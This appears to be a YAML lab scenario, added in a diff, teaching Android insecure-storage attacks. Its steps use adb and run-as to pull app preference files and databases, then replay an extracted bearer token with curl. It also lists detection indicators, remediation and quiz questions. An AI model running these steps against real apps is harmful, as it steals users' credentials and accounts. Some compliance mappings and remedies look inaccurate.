@@ -1,0 +1,103 @@
+# Category: Mobile Security - Android
+name: "Android Insecure Data Storage – Reading Shared Preferences and SQLite"
+id: "mobile-android-insecure-storage-001"
+category: "mobile_security"
+subcategory: "android"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Exploit insecure data storage in Android apps by accessing world‑readable
+  files (SharedPreferences, SQLite databases, internal storage) on a rooted
+  device. Attackers can extract saved passwords, API keys, and session tokens
+  from misconfigured apps.
+
+learning_objectives:
+  - Understand Android file permissions and storage locations
+  - Use ADB and `run-as` to access app data
+  - Extract and parse SQLite databases and XML files
+  - Identify sensitive information in cleartext
+
+tools:
+  - ADB (Android Debug Bridge)
+  - SQLite Browser
+  - Rooted Android device or emulator
+  - Android Studio (for app analysis)
+
+prerequisites:
+  - Access to APK or device with target app installed
+  - USB debugging enabled
+  - Root access recommended
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Access app data directory"
+    commands:
+      - "# List packages"
+      - "adb shell pm list packages | grep <keyword>"
+      - "# Navigate to app data"
+      - "adb shell run-as <package> ls /data/data/<package>/"
+    expected_output: "List of files (shared_prefs, databases, files)"
+    detection: "None (if device unlocked)"
+
+  - id: "step2"
+    phase: "extraction"
+    action: "Pull and analyze SharedPreferences and databases"
+    commands:
+      - "# Pull shared_prefs XML"
+      - "adb pull /data/data/<package>/shared_prefs/prefs.xml"
+      - "# Pull database"
+      - "adb pull /data/data/<package>/databases/app.db"
+      - "# Use sqlite3 or browser to read"
+    expected_output: "Credentials, tokens, or personal data"
+    detection: "None"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Use extracted credentials to access backend services"
+    commands:
+      - "# Use token in API requests"
+      - "curl -H 'Authorization: Bearer <token>' https://api.example.com/profile"
+    expected_output: "Access to user account"
+    detection: "Backend logs show access from new device/source"
+
+compliance_controls:
+  - standard: "OWASP Mobile Top 10"
+    control: "M1"
+    description: "Improper Platform Usage (insecure storage)"
+  - standard: "CWE"
+    control: "CWE-312"
+    description: "Cleartext Storage of Sensitive Information"
+
+detection:
+  network_indicators:
+    - "ADB connections from unknown source"
+  log_indicators:
+    - "App may log file access errors"
+  endpoint_indicators:
+    - "ADB commands"
+
+remediation:
+  immediate:
+    - "Use Android Keystore or EncryptedSharedPreferences"
+    - "Set files as private (MODE_PRIVATE)"
+  long_term:
+    - "Use certificate pinning and obfuscation"
+    - "Regularly test with root access to check data exposure"
+
+variables:
+  package_name: "com.example.app"
+  shared_pref: "prefs.xml"
+  db_file: "app.db"
+
+assessment_questions:
+  - "What is the difference between internal and external storage on Android?"
+  - "How does MODE_PRIVATE protect files?"
+  - "What is the role of the run-as command?"
+
+references:
+  - url: "https://developer.android.com/topic/security/data"
+    title: "Android Data Security"
+  - url: "https://owasp.org/www-project-mobile-top-10/"
+    title: "OWASP Mobile Top 10"
